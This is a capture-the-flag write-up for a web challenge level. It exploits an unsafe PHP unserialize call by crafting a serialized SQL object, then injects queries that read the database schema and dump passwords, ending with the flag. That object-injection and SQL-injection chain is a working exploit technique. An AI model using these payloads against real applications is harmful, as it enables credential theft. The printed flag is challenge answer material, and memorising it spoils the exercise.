---
layout: default
title: level04
---

Here there is an unsecured `unserialize` function, which can let us inject our own `SQL` object and then execute our malicious queries.

```php
<?php
class SQL {
    public $query = "SELECT username FROM users WHERE id=";
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}

$sql = new SQL();
echo base64_encode(serialize($sql));
?>
```
Let's examine the structure of the table:

- Request
> `Select SQL FROM sqlite_master; -- `

- Answer:
> `CREATE TABLE users(id int, username varchar, password varchar)`

Let's get password as username, because this is how it fetchs the results
```php
$ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
```

- Request
> `Select password as username from users; -- `
- Answer:
> `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`

Yay, the FLAG is found inside the passwords

**Flag:** ***`WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`*** 
